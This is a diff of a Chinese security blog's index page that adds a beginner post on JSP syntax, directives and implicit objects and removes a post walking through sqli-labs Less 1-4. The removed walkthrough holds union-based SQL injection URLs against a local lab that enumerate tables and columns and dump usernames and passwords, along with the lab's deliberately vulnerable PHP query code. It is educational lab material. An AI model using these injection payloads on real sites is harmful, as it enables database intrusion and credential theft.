@@ -236,6 +236,252 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/jaca_web_JSP技术/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/19/jaca_web_JSP技术/" itemprop="url">基础知识 | JSP基础</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-19T08:15:41+08:00">
+                2018-11-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="JSP技术"><a href="#JSP技术" class="headerlink" title="JSP技术"></a>JSP技术</h2><h3 id="JSP基本语法"><a href="#JSP基本语法" class="headerlink" title="JSP基本语法"></a>JSP基本语法</h3><blockquote>
+<p>JSP = HTML + Java代码 + JSP标签<br>  Java代码:Java脚本 声明 表达式<br>  JSP标签:指令 动作 注释    </p>
+</blockquote>
+<h4 id="JSP脚本元素"><a href="#JSP脚本元素" class="headerlink" title="JSP脚本元素"></a>JSP脚本元素</h4><p>脚本元素主要包含3种类型:</p>
+<blockquote>
+<p>脚本程序:&lt;% %&gt;<br>脚本程序可以包含任意量的Java语句、变量、方法或表达式(局部变量 用完即销毁 刷新)<br>声明语句:&lt;%! %&gt;<br>一个声明语句可以声明一个或多个变量、方法，供后面的Java代码使用。在JSP文件中，您必须先声明这些变量和方法然后才能使用它们(类变量 存在内存)<br>表达式:&lt;%= %&gt;<br>一个JSP表达式中包含的脚本语言表达式，先被转化成String，然后插入到表达式出现的地方。无引号</p>
+</blockquote>
+<p>例子:</p>
+<pre><code>#
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;ISO-8859-1&quot;&gt;
+&lt;title&gt;JSP title&lt;/title&gt;
+&lt;/head&gt;
+&lt;%!//声明语句 定义2个变量及一个print方法
+    int a=1,b=2;
+%&gt;
+&lt;%! public String print(){
+    String str = &quot;itcast&quot;;
+    return str;
+} %&gt;
+&lt;body&gt;
+&lt;% 
+    out.print(a + b); //JSP脚本元素 输出a+b
+%&gt;
+&lt;br /&gt;
+&lt;% 
+    out.print(print()); //运行print()函数
+%&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>总之,<code>&lt;%! %&gt;</code>是用来定义成员变量属性及方法的,<code>&lt;% %&gt;</code>主要用来输出内容的,因此,如果涉及了成员变量的操作,就应该使用<code>&lt;%! %&gt;</code>,而如果涉及到了输出内容,就应该使用<code>&lt;% %&gt;</code></p>
+<p>JSP表达式,将刚才代码的<code>body</code>段改为如下即可:</p>
+<pre><code>&lt;body&gt;
+&lt;%= a+b %&gt;
+&lt;br /&gt;
+&lt;%= print() %&gt;
+&lt;/body&gt;
+</code></pre><p><code>&lt;%= %&gt;</code>之间只能插入表达式,不能插入语句。且最后无分号(<code>;</code>)</p>
+<p>JSP注释(JSP的注释不会发送到前端)</p>
+<pre><code>&lt;%--this is notes--%&gt;
+</code></pre><h4 id="JSP指令"><a href="#JSP指令" class="headerlink" title="JSP指令"></a>JSP指令</h4><p>page指令:</p>
+<pre><code>&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
+//contentType是给浏览器看的,使其按照text/html进行解释  pageEncoding是给servlet看的
+还有属性import=&quot;&quot; session=&quot;true&quot; errorPage=&quot;&quot;(错误页面) iserrorpage=&quot;true&quot;(本页面就是错误页面),只有import可以出现多次 其他都只能出现一次
+</code></pre><p>include指令:</p>
+<pre><code>&lt;%@ include file=&quot;date.jsp&quot;  %&gt; //引入date.jsp 将其代码合并到demo.jsp中
+
+#date.jsp
+&lt;% out.println(new java.util.Date().toLocaleString()); %&gt;
+
+//文件路径一般用相对路径,开发后期移动方便   绝对路径:/开头
+</code></pre><p>taglib指令：引入标签库的定义,可以是自定义标签</p>
+<h4 id="JSP隐式对象"><a href="#JSP隐式对象" class="headerlink" title="JSP隐式对象"></a>JSP隐式对象</h4><p>1.out对象    </p>
+<pre><code>&lt;%
+    out.println(&quot;first line&lt;br /&gt;&quot;);  //out.print(&quot;first line&lt;br /&gt;&quot;);也可以
+    out.println(out.getBufferSize()); //输出缓冲区大小
+    response.getWriter().println(&quot;second line&lt;br /&gt;&quot;);
+
+%&gt;
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-08.21.44.30-image.png" alt="2018-11-08.21.44.30-image.png"></p>
+<p>我们可发现<code>out.println()</code>在前面,但它的输出内容却在后面。因为out对象通过print语句写入数据后,直到整个JSP页面结束,才会写入缓冲区输出,而<code>response.getWrite.println()</code>则是直接把内容写入<code>Servlet</code>引擎提供的缓冲区中。<code>Servlet</code>引擎按照缓冲区的数据存放顺序输出内容。<br>有时候我们希望<code>out</code>对象可以直接将数据写入缓冲区进行输出,我们可通过<code>page</code>的<code>buffer</code>属性来实现</p>
+<pre><code>&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; buffer=&quot;0kb&quot;%&gt;
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-08.21.51.50-image.png" alt="2018-11-08.21.51.50-image.png"></p>
+<p>这样就直接写入了。</p>
+<p>2.pageContext</p>
+<p>下面的几种是隐式对象,同时也是页面间数据共享范围<br>            范围                         有效期<br>    3.page: 当前页面                    当前页面<br>    4.request: 两两页面之间              当前请求站点<br>    5.session: 所有页面都共享 单用户      浏览器启动-浏览器关闭<br>    6.application: 所有页面,所有用户     服务器不关闭</p>
+<pre><code>&lt;% session.setAttribute(&quot;str&quot;, &quot;hello&quot;); %&gt;
+&lt;% out.println(session.getAttribute(&quot;str&quot;)); %&gt;   
+先访问set的文件,然后str存入session中,再访问get的页面,取出str值。
+</code></pre><p>7.exception对象</p>
+<pre><code>#exception.jsp
+&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; errorPage=&quot;error.jsp&quot;%&gt;
+//errorPage表明错误文件
+...
+&lt;body&gt;
+&lt;% int a=3;
+   int b=0; 
+%&gt;
+&lt;%= (a/b) %&gt;
+&lt;/body&gt;
+
+#error.jsp
+&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; isErrorPage=&quot;true&quot;%&gt;
+//isErrorPage表明当前页面为错误跳转页面
+&lt;body&gt;
+this is error;
+&lt;%= exception.getMessage() %&gt;&lt;br /&gt;
+&lt;/body&gt;
+</code></pre><p>说明exception.jsp发生错误时,会自动调用error.jsp页面进行处理</p>
+<p>还有两种分别为config与response对象<br>其他参考<a href="http://www.runoob.com/jsp/jsp-syntax.html" target="_blank" rel="noopener">JSP隐式对象</a></p>
+<h4 id="JSP行为"><a href="#JSP行为" class="headerlink" title="JSP行为"></a>JSP行为</h4><p><strong><a href="jsp:include" target="_blank" rel="noopener">jsp:include</a></strong>:将其他资源的输出内容插入到当前页面的输出内容中。<br>元素语法:<code>&lt;jsp:include page=&quot;文件路径&quot; flush=&quot;false|true&quot;&gt;</code></p>
+<pre><code>#test_include.jsp内容:
+&lt;body&gt;
+test_include的中文
+&lt;br /&gt;
+&lt;jsp:include page=&quot;include.jsp&quot; flush=&quot;true&quot; /&gt;
+&lt;body&gt;
+
+#include.jsp内容:
+&lt;body&gt;
+    &lt;% Thread.sleep(5000); %&gt;
+    include文件的中文
+&lt;/body&gt;
+</code></pre><p>访问<code>127.0.0.1:8080/test_dynamic/test_include.jsp</code>,页面会先显示<code>test_include的中文</code>,然后等待5s显示<code>include文件的中文</code>。<br>若flush的属性值为false(默认),再次访问,则会等待5s后,2行内容一起显示出来。<br>与include的区别:</p>
+<pre><code>a.&lt;jsp:include&gt;的文件与被包含文件是2个独立的文件,被包含文件的内容必须能被WEB容器独立执行。而include的内容只需要遵循JSP文件格式,包含与被包含文件是一个整体,需要合并才能翻译成一个Servlrt文件
+b.&lt;jsp:include&gt;标签引入的资源是在运行时才包含的,而且只包含运行结果,而include引入的资源是在编译时包含的,包含的是源代码
+c.&lt;jsp:include&gt;标签运行原理与RequestDispatcher.include()方法类似,即被包含的页面不能改变响应状态码及设置响应头,而include
+指令没有这方面的限制。
+</code></pre><p><strong><a href="jsp:forward" target="_blank" rel="noopener">jsp:forward</a></strong>:当前请求转发到其他WEB资源,在执行请求转发后的当前页面将不再执行<br>元素语法:<code>&lt;jsp:forward page=&quot;文件路径&quot; /&gt;</code>        </p>
+<pre><code>#jspforward.jsp
+&lt;jsp:forward page=&quot;date.jsp&quot;&gt;&lt;/jsp:forward&gt;
+&lt;% out.println(1); %&gt; //不执行了
+
+#date.jsp
+&lt;% out.println(new java.util.Date().toLocaleString()); %&gt; //输出当前时间
+</code></pre><p>由于请求转发是服务端的操作,浏览器并不知道请求页面,所以浏览器的地址栏不会变化(jspforward.jsp)    </p>
+<p>其他JSP行为请参考:<a href="http://www.runoob.com/jsp/jsp-syntax.html" target="_blank" rel="noopener">JSP行为</a></p>
+<p>判断语句:</p>
+<pre><code>&lt;h3&gt;if....else例子&lt;/h3&gt;
+&lt;% if (day == 1 | day == 7) { %&gt;
+      &lt;p&gt;今天是周末&lt;/p&gt;
+&lt;% } else { %&gt;
+      &lt;p&gt;今天不是周末&lt;/p&gt;
+&lt;% } %&gt;
+&lt;/body&gt;
+</code></pre><p><a href="http://www.runoob.com/jsp/jsp-syntax.html" target="_blank" rel="noopener">http://www.runoob.com/jsp/jsp-syntax.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/12/Weblogic 漏洞复现/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2764,220 +3010,6 @@ print &quot;%s表的%s列的数据:%s&quot;%(table_list[-1],column_list[1],date_
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/22/Sqli-labs_Less1-4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/22/Sqli-labs_Less1-4/" itemprop="url">Sqli-labs Error Based Sqli Less1-4</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-22T08:15:41+08:00">
-                2018-10-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>项目下载地址:<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a><br>基础部分请参考笔者以前的文章:<br><a href="https://p0rz9.github.io/2018/10/15/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/15/SQL注入基础/</a><br><a href="https://p0rz9.github.io/2018/10/12/mysql%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/12/mysql基础命令/</a></p>
-<p><strong>Less-1:</strong></p>
-<p>通过更换id观察,可发现程序会通过遍历id获取对应的<code>name</code>与<code>password</code>:<br><img src="http://static.zybuluo.com/chhyx/kwee90sb6uk38mne895liw0u/image_1cqcvjah013o172f1qq9ncld61m.png" alt="image_1cqcvjah013o172f1qq9ncld61m.png-34.3kB"><br><img src="http://static.zybuluo.com/chhyx/19yl78kf7inas5m645h5tbp3/image_1cqcvk5631ij017br11471qk127s13.png" alt="image_1cqcvk5631ij017br11471qk127s13.png-35.5kB"></p>
-<p>加<code>&#39;</code>查看报错信息:<br><img src="http://static.zybuluo.com/chhyx/ycj2g4ihotcyr7osq3th27ds/image_1cqd1hmpqpgf1035av8s83rat51.png" alt="image_1cqd1hmpqpgf1035av8s83rat51.png-35.5kB"></p>
-<p>在上述的错误信息中,我们可以看到我们输入的1’在经过sql语句拼接后构成了 <code>&#39;1&#39;&#39; limit 0,1</code> 多加了一个<code>&#39;</code>,那我们可以利用在输入语句最后加注释(–+)的方法将他注释掉。</p>
-<p>查看字段:</p>
-<pre><code>http://127.0.0.1:86/less-1/index.php?id=1&apos; order by 3--+ 正确
-http://127.0.0.1:86/less-1/index.php?id=1&apos; order by 4--+ 错误
-</code></pre><p>说明字段为3,因为<code>order by 3</code> 表示用查询字段中的第3个字段进行排序,而<code>order by 4</code>报错说明不存在第4个字段,表明该表一共具有3个字段。</p>
-<p>判断显示位:</p>
-<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,2,3--+ 
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/mem0kwpifpbgx05yeq5s6z7b/image_1cqd00bpc10g5ttl4cb1b58qrh20.png" alt="image_1cqd00bpc10g5ttl4cb1b58qrh20.png-33.9kB"></p>
-<p>使用union时,必须使前面的sql语句查询出错(不存在id=-1的用户),因为只有前面的sql语句结果为空就会显示我们自己构造的SQL语句 即<code>select 1,2,3</code></p>
-<p>爆数据库名(将显示位替换为mysql的信息函数):<br><img src="http://static.zybuluo.com/chhyx/a5shqxuf55lzhsk6s2u1ehwl/image_1cqd07827jru1fnj1mll1slr1s7i2d.png" alt="image_1cqd07827jru1fnj1mll1slr1s7i2d.png-35.7kB"></p>
-<p>表明当前使用的数据库名为<code>security</code> 用户为<code>root@localhost</code></p>
-<p>爆<code>security</code>数据库的所有表名:</p>
-<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),3--+ 
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/4mdwydzoarb2e96xaerxuur0/image_1cqd0h3gn1gj513qqqh6rhi8lf2q.png" alt="image_1cqd0h3gn1gj513qqqh6rhi8lf2q.png-53.4kB"></p>
-<p>爆<code>users</code>表下的所有字段名:</p>
-<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),3--+ 
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/w0hpd6qqop1tqytcw5tr6ntn/image_1cqd0ld8t1dh3ebeeeeeihh5l47.png" alt="image_1cqd0ld8t1dh3ebeeeeeihh5l47.png-46.6kB"></p>
-<p>获取<code>username</code>与<code>password</code>内容:</p>
-<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,(select group_concat(username,&apos;:&apos;,password) from security.users),3--+ 
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/ond8909uzodpo0f40r9dujth/image_1cqd0q9aj1qbosesl631n8s1u74k.png" alt="image_1cqd0q9aj1qbosesl631n8s1u74k.png-62.1kB"></p>
-<p><code>Less-1</code>源码:</p>
-<pre><code>&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-error_reporting(0);
-// take the variables 
-if(isset($_GET[&apos;id&apos;]))
-{
-$id=$_GET[&apos;id&apos;];
-//logging the connection parameters to a file for analysis.
-$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);
-fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);
-fclose($fp);
-
-// connectivity 
-
-$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
-$result=mysql_query($sql);
-$row = mysql_fetch_array($result);
-
-    if($row)
-    {
-      echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;
-      echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];
-      echo &quot;&lt;br&gt;&quot;;
-      echo &apos;Your Password:&apos; .$row[&apos;password&apos;];
-      echo &quot;&lt;/font&gt;&quot;;
-      }
-    else 
-    {
-    echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;
-    print_r(mysql_error());
-    echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
-
-?&gt;
-</code></pre><p><code>Less1-Less4</code>都可利用上述<code>union</code>操作进行注入,下面就不再追溯了。</p>
-<p><strong>Less-2:</strong></p>
-<p>查看报错信息:<br><img src="http://static.zybuluo.com/chhyx/fqi5jyne11u1ehliyzs0ry7l/image_1cqd1lh8q1d1v76030n10ub9kc5u.png" alt="image_1cqd1lh8q1d1v76030n10ub9kc5u.png-45.2kB"><br>因为报错信息是在<code>limit 0,1</code>附近,猜测后台查询语句为:<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1</code>对id无处理 直接查询。</p>
-<p>查看字段:</p>
-<pre><code>http://127.0.0.1:86/less-2/index.php?id=1 order by 3--+
-http://127.0.0.1:86/less-2/index.php?id=1 order by 4--+
-</code></pre><p>判断显示位:</p>
-<pre><code>http://127.0.0.1:86/less-2/index.php?id=-1 union select 1,2,3--+
-</code></pre><p>之后与<code>Less-1</code>一样 将显示位替换为查询语句即可。</p>
-<p><code>Less-2</code>源码,只列出sql语句部分 剩下的与<code>Less-1</code>相同:</p>
-<pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
-</code></pre><p><strong>Less-3:</strong></p>
-<p>报错信息:<br><img src="http://static.zybuluo.com/chhyx/un3nxsfayp67s4breg7c3cl0/image_1cqd1rn40qsg17jj1qre1bq812129q.png" alt="image_1cqd1rn40qsg17jj1qre1bq812129q.png-209.5kB"><br>根据报错信息 这里就需要闭合下单引号与括号了</p>
-<p>查看字段:</p>
-<pre><code>http://127.0.0.1:86/less-3/index.php?id=1&apos;) order by 3--+
-http://127.0.0.1:86/less-3/index.php?id=1&apos;) order by 4--+
-</code></pre><p>判断显示位:</p>
-<pre><code>http://127.0.0.1:86/less-3/index.php?id=-1&apos;) union select 1,2,3--+
-</code></pre><p>之后与<code>Less-1</code>一样 将显示位替换为查询语句即可。</p>
-<p><code>Less-3</code>源码,只列出sql语句部分 剩下的与<code>Less-1</code>相同:</p>
-<pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;
-</code></pre><p><strong>Less-4:</strong></p>
-<p>输入单引号发现不报错:<br><img src="http://static.zybuluo.com/chhyx/mmkfe12lisrvwpd525f6er0o/image_1cqd22cokoj87a31vuspo25a0an.png" alt="image_1cqd22cokoj87a31vuspo25a0an.png-60.6kB"></p>
-<p>再次测试双引号 成功报错:<br><img src="http://static.zybuluo.com/chhyx/iz7bh878j9fsrtxt1q7zpq9t/image_1cqd23l5j1lhi7jai3q126a5lsb4.png" alt="image_1cqd23l5j1lhi7jai3q126a5lsb4.png-209.2kB"></p>
-<p>所以这里需要闭合双引号与括号</p>
-<p>查看字段:</p>
-<pre><code>http://127.0.0.1:86/less-4/index.php?id=1&quot;) order by 3--+
-http://127.0.0.1:86/less-4/index.php?id=1&quot;) order by 4--+
-</code></pre><p>判断显示位:</p>
-<pre><code>http://127.0.0.1:86/less-3/index.php?id=1&quot;) union select 1,2,3--+
-</code></pre><p>之后与<code>Less-1</code>一样 将显示位替换为查询语句即可。</p>
-<p><code>Less-4</code>源码,只列出sql语句部分,剩下的与<code>Less-1</code>相同:</p>
-<pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;
-</code></pre>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3028,7 +3060,7 @@ http://127.0.0.1:86/less-4/index.php?id=1&quot;) order by 4--+
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-count">42</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -3041,7 +3073,7 @@ http://127.0.0.1:86/less-4/index.php?id=1&quot;) order by 4--+
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
